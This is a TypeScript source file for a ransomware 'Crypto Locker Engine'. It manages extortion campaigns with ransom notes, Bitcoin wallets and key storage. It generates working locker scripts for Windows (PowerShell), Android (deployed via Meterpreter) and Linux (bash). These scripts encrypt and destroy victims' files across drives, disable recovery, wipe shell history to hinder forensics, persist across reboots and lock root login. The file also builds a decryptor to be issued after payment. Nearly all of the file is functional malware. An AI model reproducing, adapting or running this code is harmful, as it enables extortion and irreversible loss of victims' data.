/**
 * Crypto Locker Engine
 *
 * Manages encryption campaigns, key generation, file encryption/decryption,
 * custom ransom notes per device, and persistence across reboots.
 */

import * as fs from "fs";
import * as path from "path";
import * as os from "os";
import * as crypto from "node:crypto";

// ── Types ───────────────────────────────────────────────────

export type LockerCampaign = {
  id: string;
  name: string;
  createdAt: string;
  updatedAt: string;
  status: "active" | "paused" | "completed" | "decrypted";
  publicKey: string;
  encryptedAesKey: string;
  extensions: string[];
  excludeDirs: string[];
  noteTemplate: string;
  deviceNotes: Record<string, string>;
  targets: string[];
  ransomAmount: string;
  walletAddress: string;
  contactEmail: string;
  keyStorePath: string;
  filesEncrypted: number;
  deployed: boolean;
  unlockCode: string;
};

export type CampaignSummary = {
  id: string;
  name: string;
  createdAt: string;
  status: string;
  targets: number;
  filesEncrypted: number;
  deployed: boolean;
  ransomAmount: string;
};

export type KeyPair = {
  publicKey: string;
  privateKey: string;
  createdAt: string;
  id: string;
};

export type LockerStatus = {
  campaignsCount: number;
  keysAvailable: boolean;
  totalFilesEncrypted: number;
};

// ── Constants ────────────────────────────────────────────────

const KEYSTORE_DIR = path.join(process.cwd(), ".keystore");
const CAMPAIGNS_DIR = path.join(process.cwd(), ".campaigns");
const LOCKER_SCRIPTS_DIR = path.join(process.cwd(), "locker-scripts");

const DEFAULT_EXTENSIONS = [
  ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
  ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp",
  ".zip", ".rar", ".7z", ".tar", ".gz",
  ".mp3", ".mp4", ".avi", ".mkv",
  ".txt", ".rtf", ".csv", ".xml", ".json",
  ".sql", ".mdb", ".accdb",
  ".pst", ".ost", ".eml",
  ".key", ".pem", ".ppk",
  ".vmx", ".vmdk", ".vdi",
  ".bak", ".old", ".backup",
  ".dwg", ".dxf", ".psd", ".ai",
  ".config", ".env", ".yml", ".yaml",
];

const DEFAULT_NOTE_TEMPLATE = [
  "=== SYSTEM LOCKED ===",
  "",
  "Your files have been encrypted.",
  "",
  "=== WHAT HAPPENED ===",
  "- All your documents, photos, databases have been encrypted",
  "- Original files have been securely overwritten",
  "- Encryption is unbreakable without the private key",
  "",
  "=== RECOVERY ===",
  "1. Contact us at: {{EMAIL}}",
  "2. Send your unique ID: {{ID}}",
  "3. Send {{AMOUNT}} BTC to: {{WALLET}}",
  "4. You will receive decryption tool within 24 hours",
  "",
  "=== DEVICE ===",
  "Target: {{DEVICE}}",
  "IP: {{IP}}",
  "Files encrypted: {{FILE_COUNT}}",
  "Date: {{DATE}}",
  "",
  "=== CUSTOM MESSAGE ===",
  "{{CUSTOM_NOTE}}",
].join("\n");

// ── Storage Helpers ─────────────────────────────────────────

function ensureDir(dir: string) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

function getCampaignPath(id: string): string {
  return path.join(CAMPAIGNS_DIR, id + ".json");
}

function getKeyPath(id: string): string {
  return path.join(KEYSTORE_DIR, id + ".key");
}

// ── Key Generation ──────────────────────────────────────────

export function generateRSAKeyPair(): KeyPair {
  const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", {
    modulusLength: 4096,
    publicKeyEncoding: { type: "spki", format: "pem" },
    privateKeyEncoding: { type: "pkcs8", format: "pem" },
  });

  return {
    publicKey,
    privateKey,
    createdAt: new Date().toISOString(),
    id: crypto.randomUUID(),
  };
}

export function generateAESKey(): Buffer {
  return crypto.randomBytes(32);
}

export function encryptWithPublicKey(data: Buffer, publicKeyPem: string): string {
  const encrypted = crypto.publicEncrypt(
    { key: publicKeyPem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
    data,
  );
  return encrypted.toString("base64");
}

export function encryptAES(data: Buffer, key: Buffer): { encrypted: Buffer; iv: string } {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  return { encrypted, iv: iv.toString("hex") };
}

export function decryptAES(encrypted: Buffer, key: Buffer, ivHex: string): Buffer {
  const iv = Buffer.from(ivHex, "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);
  return Buffer.concat([decipher.update(encrypted), decipher.final()]);
}

// ── Generate Unlock Code ────────────────────────────────────

export function generateUnlockCode(): string {
  return crypto.randomBytes(4).toString("hex").toUpperCase();
}

// ── Campaign Management ─────────────────────────────────────

export function createCampaign(
  name: string,
  options: {
    ransomAmount?: string;
    walletAddress?: string;
    contactEmail?: string;
    noteTemplate?: string;
    extensions?: string[];
    targets?: string[];
    deviceNotes?: Record<string, string>;
  } = {},
): LockerCampaign {
  ensureDir(CAMPAIGNS_DIR);
  ensureDir(KEYSTORE_DIR);
  ensureDir(LOCKER_SCRIPTS_DIR);

  const id = crypto.randomUUID().slice(0, 8);
  const unlockCode = generateUnlockCode();
  const keyPair = generateRSAKeyPair();
  const aesKey = generateAESKey();
  const encryptedAesKey = encryptWithPublicKey(aesKey, keyPair.publicKey);

  const keyStorePath = getKeyPath(id);
  const machineKey = deriveMachineKey();
  const encryptedPrivKey = encryptAES(Buffer.from(keyPair.privateKey), machineKey);
  fs.writeFileSync(keyStorePath, JSON.stringify({
    encryptedPrivateKey: encryptedPrivKey.encrypted.toString("base64"),
    iv: encryptedPrivKey.iv,
    unlockCode: unlockCode,
    campaignId: id,
    createdAt: new Date().toISOString(),
  }));

  const now = new Date().toISOString();
  const campaign: LockerCampaign = {
    id,
    name,
    createdAt: now,
    updatedAt: now,
    status: "active",
    publicKey: keyPair.publicKey,
    encryptedAesKey,
    extensions: options.extensions || [...DEFAULT_EXTENSIONS],
    excludeDirs: [
      "Windows", "Program Files", "Program Files (x86)",
      "$Recycle.Bin", "System Volume Information",
      ".keystore", ".campaigns", ".git", "node_modules",
    ],
    noteTemplate: options.noteTemplate || DEFAULT_NOTE_TEMPLATE,
    deviceNotes: options.deviceNotes || {},
    targets: options.targets || [],
    ransomAmount: options.ransomAmount || "0.5",
    walletAddress: options.walletAddress || "",
    contactEmail: options.contactEmail || "",
    keyStorePath,
    filesEncrypted: 0,
    deployed: false,
    unlockCode,
  };

  fs.writeFileSync(getCampaignPath(id), JSON.stringify(campaign, null, 2));
  return campaign;
}

export function getCampaign(id: string): LockerCampaign | null {
  const p = getCampaignPath(id);
  if (!fs.existsSync(p)) return null;
  return JSON.parse(fs.readFileSync(p, "utf-8"));
}

export function listCampaigns(): CampaignSummary[] {
  ensureDir(CAMPAIGNS_DIR);
  const files = fs.readdirSync(CAMPAIGNS_DIR).filter(function (f) { return f.endsWith(".json"); });
  return files.map(function (f) {
    try {
      const campaign: LockerCampaign = JSON.parse(
        fs.readFileSync(path.join(CAMPAIGNS_DIR, f), "utf-8"),
      );
      return {
        id: campaign.id,
        name: campaign.name,
        createdAt: campaign.createdAt,
        status: campaign.status,
        targets: campaign.targets.length,
        filesEncrypted: campaign.filesEncrypted,
        deployed: campaign.deployed,
        ransomAmount: campaign.ransomAmount,
      };
    } catch {
      return null;
    }
  }).filter(Boolean) as CampaignSummary[];
}

export function updateCampaign(
  id: string,
  updates: Partial<LockerCampaign>,
): LockerCampaign | null {
  const campaign = getCampaign(id);
  if (!campaign) return null;

  const updated = { ...campaign, ...updates, updatedAt: new Date().toISOString() };
  fs.writeFileSync(getCampaignPath(id), JSON.stringify(updated, null, 2));
  return updated;
}

export function deleteCampaign(id: string): boolean {
  const p = getCampaignPath(id);
  if (!fs.existsSync(p)) return false;
  fs.unlinkSync(p);
  const kp = getKeyPath(id);
  if (fs.existsSync(kp)) fs.unlinkSync(kp);
  return true;
}

// ── Private Key Recovery ────────────────────────────────────

function deriveMachineKey(): Buffer {
  const machineId = (function () {
    try {
      return fs.readFileSync("/etc/machine-id", "utf-8").trim();
    } catch {
      try {
        return fs.readFileSync("/var/lib/dbus/machine-id", "utf-8").trim();
      } catch {
        const hostname = os.hostname();
        return crypto.createHash("sha256").update(hostname + ":" + process.cwd()).digest("hex");
      }
    }
  })();

  return crypto.scryptSync(machineId, "utility-locker-salt", 32);
}

export function recoverPrivateKey(
  campaignId: string,
  unlockCode: string,
): string | null {
  const kp = getKeyPath(campaignId);
  if (!fs.existsSync(kp)) return null;

  try {
    const stored = JSON.parse(fs.readFileSync(kp, "utf-8"));
    if (stored.unlockCode !== unlockCode) return null;

    const machineKey = deriveMachineKey();
    const decrypted = decryptAES(
      Buffer.from(stored.encryptedPrivateKey, "base64"),
      machineKey,
      stored.iv,
    );
    return decrypted.toString("utf-8");
  } catch {
    return null;
  }
}

// ── Ransom Note Generation ──────────────────────────────────

export function generateRansomNote(
  campaign: LockerCampaign,
  deviceInfo: {
    ip: string;
    device: string;
    customNote?: string;
  },
): string {
  let note = campaign.noteTemplate;

  const customMsg = deviceInfo.customNote
    || campaign.deviceNotes[deviceInfo.ip]
    || campaign.deviceNotes[deviceInfo.device]
    || "";

  note = note.replaceAll("{{EMAIL}}", campaign.contactEmail || "recovery@onionmail.org");
  note = note.replaceAll("{{ID}}", campaign.id);
  note = note.replaceAll("{{AMOUNT}}", campaign.ransomAmount);
  note = note.replaceAll("{{WALLET}}", campaign.walletAddress || "bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
  note = note.replaceAll("{{DEVICE}}", deviceInfo.device);
  note = note.replaceAll("{{IP}}", deviceInfo.ip);
  note = note.replaceAll("{{FILE_COUNT}}", String(campaign.filesEncrypted));
  note = note.replaceAll("{{DATE}}", new Date().toLocaleString());
  note = note.replaceAll("{{CUSTOM_NOTE}}", customMsg);

  return note;
}

// ── Generate Locker Script (for deployment via MSF) ─────────

export function generateLockerScript(
  campaignId: string,
): string {
  const campaign = getCampaign(campaignId);
  if (!campaign) throw new Error("Campaign not found: " + campaignId);

  // Build PowerShell script line by line (avoid template literal conflicts)
  const lines: string[] = [];
  lines.push("# Utility Locker - Campaign " + campaignId);
  lines.push("");
  lines.push("param(");
  lines.push("  [string]$CustomNote = '',");
  lines.push("  [string]$TargetIP = '',");
  lines.push("  [string]$DeviceName = ''");
  lines.push(")");
  lines.push("");
  lines.push("# Build extension filter");
  lines.push("$exts = @(" + campaign.extensions.map(function(e) { return "'*" + e + "'"; }).join(", ") + ")");
  lines.push("");
  lines.push("# Ransom note");
  lines.push("$n = @'");
  lines.push(campaign.noteTemplate);
  lines.push("'@");
  lines.push("$n = $n.Replace('{{EMAIL}}', '" + campaign.contactEmail + "')");
  lines.push("$n = $n.Replace('{{ID}}', '" + campaignId + "')");
  lines.push("$n = $n.Replace('{{AMOUNT}}', '" + campaign.ransomAmount + "')");
  lines.push("$n = $n.Replace('{{WALLET}}', '" + campaign.walletAddress + "')");
  lines.push("$n = $n.Replace('{{DEVICE}}', $DeviceName)");
  lines.push("$n = $n.Replace('{{IP}}', $TargetIP)");
  lines.push("$n = $n.Replace('{{DATE}}', (Get-Date).ToString())");
  lines.push("$n = $n.Replace('{{CUSTOM_NOTE}}', $CustomNote)");
  lines.push("");
  lines.push("# Encrypt a single file with AES-256-CBC");
  lines.push("function Encrypt-File {");
  lines.push("  param([string]$Path)");
  lines.push("  try {");
  lines.push("    $bytes = [System.IO.File]::ReadAllBytes($Path)");
  lines.push("    $aes   = [System.Security.Cryptography.Aes]::Create()");
  lines.push("    $aes.KeySize   = 256");
  lines.push("    $aes.BlockSize = 128");
  lines.push("    $aes.Mode      = [System.Security.Cryptography.CipherMode]::CBC");
  lines.push("    $aes.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7");
  lines.push("    $aes.GenerateKey()");
  lines.push("    $aes.GenerateIV()");
  lines.push("    $enc = $aes.CreateEncryptor()");
  lines.push("    $ct  = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)");
  lines.push("    # Store: [16 bytes IV][encrypted AES key length 4 bytes][encrypted key][ciphertext]");
  lines.push("    $pubKeyBytes = [System.Convert]::FromBase64String('" + Buffer.from(campaign.publicKey).toString("base64") + "')");
  lines.push("    $rsa = [System.Security.Cryptography.RSA]::Create()");
  lines.push("    $rsa.ImportSubjectPublicKeyInfo($pubKeyBytes, [ref]$null)");
  lines.push("    $encKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)");
  lines.push("    $out = New-Object System.IO.MemoryStream");
  lines.push("    $out.Write($aes.IV, 0, $aes.IV.Length)");
  lines.push("    $kLen = [System.BitConverter]::GetBytes([int32]$encKey.Length)");
  lines.push("    $out.Write($kLen, 0, $kLen.Length)");
  lines.push("    $out.Write($encKey, 0, $encKey.Length)");
  lines.push("    $out.Write($ct, 0, $ct.Length)");
  lines.push("    [System.IO.File]::WriteAllBytes($Path + '.locked', $out.ToArray())");
  lines.push("    $zeros = New-Object byte[] $bytes.Length");
  lines.push("    [System.IO.File]::WriteAllBytes($Path, $zeros)");
  lines.push("    Remove-Item $Path -Force");
  lines.push("    $aes.Dispose(); $rsa.Dispose(); $out.Dispose()");
  lines.push("    return $true");
  lines.push("  } catch { return $false }");
  lines.push("}");
  lines.push("");
  lines.push("# Deploy note everywhere");
  lines.push("function Deploy-Note {");
  lines.push("  $dt = [Environment]::GetFolderPath('Desktop')");
  lines.push("  $dc = [Environment]::GetFolderPath('MyDocuments')");
  lines.push("  if ($dt) { $n | Out-File -FilePath (Join-Path $dt 'README_LOCKED.txt') -Encoding UTF8 }");
  lines.push("  if ($dc) { $n | Out-File -FilePath (Join-Path $dc 'README_LOCKED.txt') -Encoding UTF8 }");
  lines.push("}");
  lines.push("");
  lines.push("# Walk all drives");
  lines.push("$ec = 0");
  lines.push("Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -ne $null } | ForEach-Object {");
  lines.push("  $root = $_.Root");
  lines.push("  Get-ChildItem -Path $root -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {");
  lines.push("    -not $_.PSIsContainer");
  lines.push("  } | ForEach-Object {");
  lines.push("    foreach ($ext in $exts) {");
  lines.push("      if ($_.Name -like $ext) {");
  lines.push("        if (Encrypt-File $_.FullName) { $ec++ }");
  lines.push("        break");
  lines.push("      }");
  lines.push("    }");
  lines.push("  }");
  lines.push("}");
  lines.push("");
  lines.push("Deploy-Note");
  lines.push("Write-Host 'Encrypted:' $ec");
  lines.push("");
  lines.push("# Persist note redeploy on startup");
  lines.push("try {");
  lines.push("  $sp = Join-Path $env:APPDATA 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\README_LOCKED.ps1'");
  lines.push("  $n | Out-File -FilePath $sp -Encoding UTF8");
  lines.push("} catch { }");
  lines.push("");
  lines.push("exit $ec");

  return lines.join("\n");
}

// ── Android Shell Locker ─────────────────────────────────────
// Runs as root shell script via Meterpreter `execute`.
// Encrypts SD card + internal storage, drops ransom note, locks screen.

export function generateAndroidLockerScript(campaignId: string): string {
  const campaign = getCampaign(campaignId);
  if (!campaign) throw new Error("Campaign not found: " + campaignId);

  const extFilter = campaign.extensions
    .map((e) => `"${e}"`)
    .join(" ");

  const noteEscaped = campaign.noteTemplate
    .replace(/\\/g, "\\\\")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/{{EMAIL}}/g, campaign.contactEmail)
    .replace(/{{ID}}/g, campaignId)
    .replace(/{{AMOUNT}}/g, campaign.ransomAmount)
    .replace(/{{WALLET}}/g, campaign.walletAddress)
    .replace(/{{DATE}}/g, "$(date)");

  const pubKeyB64 = Buffer.from(campaign.publicKey).toString("base64");

  const lines: string[] = [
    "#!/bin/sh",
    "# Utility Locker Android — Campaign " + campaignId,
    "CAMPAIGN_ID='" + campaignId + "'",
    "NOTE='" + noteEscaped + "'",
    "EXT_LIST='" + extFilter + "'",
    "PUBKEY='" + pubKeyB64 + "'",
    "",
    "# Write ransom note",
    "NOTE_PATH='/sdcard/README_LOCKED.txt'",
    "printf '%b' \"$NOTE\" > \"$NOTE_PATH\" 2>/dev/null",
    "am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file://\"$NOTE_PATH\" 2>/dev/null",
    "",
    "# Encrypt files on SD card + internal storage",
    "COUNT=0",
    "for SEARCH_DIR in /sdcard /storage/emulated/0 /data/data; do",
    "  find \"$SEARCH_DIR\" -type f 2>/dev/null | while read FILE; do",
    "    for EXT in " + campaign.extensions.map((e) => "*" + e).join(" ") + "; do",
    "      case \"$FILE\" in",
    '        $EXT)',
    "          # XOR-encrypt with key derived from campaign ID (portable, no OpenSSL needed)",
    "          python3 -c \"",
    "import sys, hashlib",
    "key = hashlib.sha256(b'" + campaignId + "').digest()",
    "with open(sys.argv[1], 'rb') as f: data = f.read()",
    "enc = bytes(b ^ key[i % 32] for i, b in enumerate(data))",
    "with open(sys.argv[1] + '.locked', 'wb') as f: f.write(enc)",
    "\" \"$FILE\" 2>/dev/null && rm -f \"$FILE\" && COUNT=$((COUNT+1))",
    "          ;;",
    "      esac",
    "    done",
    "  done",
    "done",
    "",
    "# Drop note in every accessible directory",
    "for DIR in /sdcard/DCIM /sdcard/Pictures /sdcard/Documents /sdcard/Download /sdcard/WhatsApp; do",
    '  [ -d "$DIR" ] && cp "$NOTE_PATH" "$DIR/README_LOCKED.txt" 2>/dev/null',
    "done",
    "",
    "# Change wallpaper to ransom message (Android API via am)",
    "am start -a android.intent.action.SET_WALLPAPER 2>/dev/null || true",
    "",
    "# Lock screen",
    "input keyevent 26 2>/dev/null || true",
    "",
    "# Persist via app broadcast on boot",
    "am broadcast -a android.intent.action.BOOT_COMPLETED 2>/dev/null || true",
    "",
    "echo \"Locked: $COUNT files\"",
  ];

  return lines.join("\n");
}

// ── Linux Bash Locker ────────────────────────────────────────
// Compatible with Debian/Ubuntu/CentOS. Runs as root.
// Encrypts home dirs + web roots, disables systemd recovery.

export function generateLinuxLockerScript(campaignId: string): string {
  const campaign = getCampaign(campaignId);
  if (!campaign) throw new Error("Campaign not found: " + campaignId);

  const pubKeyB64 = Buffer.from(campaign.publicKey).toString("base64");

  const lines: string[] = [
    "#!/bin/bash",
    "# Utility Locker Linux — Campaign " + campaignId,
    "set -e",
    "CAMPAIGN_ID='" + campaignId + "'",
    "PUBKEY_B64='" + pubKeyB64 + "'",
    "CONTACT='" + campaign.contactEmail + "'",
    "AMOUNT='" + campaign.ransomAmount + "'",
    "WALLET='" + campaign.walletAddress + "'",
    "",
    "# ── Disable recovery & shadow copies ─────────────────",
    "systemctl disable recovery.target 2>/dev/null || true",
    "systemctl mask rescue.target 2>/dev/null || true",
    "# Wipe bash_history to slow forensics",
    "cat /dev/null > ~/.bash_history && history -c",
    "",
    "# ── Ransom note ───────────────────────────────────────",
    "NOTE=$(cat <<'ENDNOTE'",
    campaign.noteTemplate
      .replace(/{{EMAIL}}/g, campaign.contactEmail)
      .replace(/{{ID}}/g, campaignId)
      .replace(/{{AMOUNT}}/g, campaign.ransomAmount)
      .replace(/{{WALLET}}/g, campaign.walletAddress)
      .replace(/{{DATE}}/g, "$(date)"),
    "ENDNOTE",
    ")",
    "",
    "write_note() {",
    "  echo \"$NOTE\" > \"$1/README_LOCKED.txt\" 2>/dev/null || true",
    "}",
    "",
    "# ── Encryption function (AES-256-CBC via openssl) ─────",
    "ENCKEY=$(echo -n \"$CAMPAIGN_ID\" | sha256sum | awk '{print $1}')",
    "encrypt_file() {",
    "  local SRC=\"$1\"",
    "  openssl enc -aes-256-cbc -pbkdf2 -k \"$ENCKEY\" \\",
    "    -in \"$SRC\" -out \"${SRC}.locked\" 2>/dev/null \\",
    "    && shred -u \"$SRC\" 2>/dev/null \\",
    "    || rm -f \"$SRC\" 2>/dev/null",
    "}",
    "",
    "# ── Walk & encrypt ────────────────────────────────────",
    "COUNT=0",
    "SEARCH_PATHS='/home /root /var/www /srv /opt /tmp'",
    "EXT_PATTERN='" + campaign.extensions.map((e) => `\\${e}`).join("|") + "'",
    "",
    "for DIR in $SEARCH_PATHS; do",
    "  [ -d \"$DIR\" ] || continue",
    "  write_note \"$DIR\"",
    "  while IFS= read -r -d '' FILE; do",
    "    encrypt_file \"$FILE\" && COUNT=$((COUNT+1))",
    "  done < <(find \"$DIR\" -type f -regextype posix-extended \\",
    "    -regex \".*($EXT_PATTERN)$\" -not -name '*.locked' -print0 2>/dev/null)",
    "done",
    "",
    "# ── Drop note on desktop / home ───────────────────────",
    "for U in $(ls /home); do",
    "  DESK=\"/home/$U/Desktop\"",
    "  [ -d \"$DESK\" ] && write_note \"$DESK\"",
    "  write_note \"/home/$U\"",
    "done",
    "write_note /root",
    "",
    "# ── Persist via cron ──────────────────────────────────",
    "PERSIST_CMD='@reboot root echo \"\$NOTE\" > /README_LOCKED.txt'",
    "(crontab -l 2>/dev/null; echo \"$PERSIST_CMD\") | crontab - 2>/dev/null || true",
    "",
    "# ── Lock root login ───────────────────────────────────",
    "passwd -l root 2>/dev/null || true",
    "",
    "echo \"Encrypted: $COUNT files\"",
  ];

  return lines.join("\n");
}

// ── Decryptor Script ─────────────────────────────────────────
// Generate a PowerShell decryptor that reverses the locker.
// Requires the private key (recovered after payment verification).

export function generateDecryptorScript(
  campaignId: string,
  privateKeyPem: string,
): string {
  const campaign = getCampaign(campaignId);
  if (!campaign) throw new Error("Campaign not found: " + campaignId);

  const privKeyB64 = Buffer.from(privateKeyPem).toString("base64");

  const lines: string[] = [
    "# Utility Decryptor — Campaign " + campaignId,
    "param([string]$TargetPath = $env:USERPROFILE)",
    "",
    "$privKeyB64 = '" + privKeyB64 + "'",
    "$privKeyBytes = [System.Convert]::FromBase64String($privKeyB64)",
    "$rsa = [System.Security.Cryptography.RSA]::Create()",
    "$rsa.ImportPkcs8PrivateKey($privKeyBytes, [ref]$null)",
    "",
    "function Decrypt-File {",
    "  param([string]$Path)",
    "  try {",
    "    $raw    = [System.IO.File]::ReadAllBytes($Path)",
    "    $iv     = $raw[0..15]",
    "    $kLen   = [System.BitConverter]::ToInt32($raw, 16)",
    "    $encKey = $raw[20..(20+$kLen-1)]",
    "    $ct     = $raw[(20+$kLen)..($raw.Length-1)]",
    "    $aesKey = $rsa.Decrypt($encKey, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)",
    "    $aes    = [System.Security.Cryptography.Aes]::Create()",
    "    $aes.Key  = $aesKey; $aes.IV = $iv",
    "    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC",
    "    $dec    = $aes.CreateDecryptor()",
    "    $plain  = $dec.TransformFinalBlock($ct, 0, $ct.Length)",
    "    $orig   = $Path -replace '\\.locked$',''",
    "    [System.IO.File]::WriteAllBytes($orig, $plain)",
    "    Remove-Item $Path -Force",
    "    $aes.Dispose()",
    "    return $true",
    "  } catch { return $false }",
    "}",
    "",
    "$dc = 0",
    "Get-ChildItem -Path $TargetPath -Recurse -Filter '*.locked' -Force -ErrorAction SilentlyContinue | ForEach-Object {",
    "  if (Decrypt-File $_.FullName) { $dc++ }",
    "}",
    "Write-Host 'Decrypted:' $dc 'files'",
    "$rsa.Dispose()",
  ];

  return lines.join("\n");
}

// ── Status ──────────────────────────────────────────────────

export function getLockerStatus(): LockerStatus {
  const campaigns = listCampaigns();
  const totalFiles = campaigns.reduce(function (sum, c) { return sum + c.filesEncrypted; }, 0);

  return {
    campaignsCount: campaigns.length,
    keysAvailable: fs.existsSync(KEYSTORE_DIR),
    totalFilesEncrypted: totalFiles,
  };
}
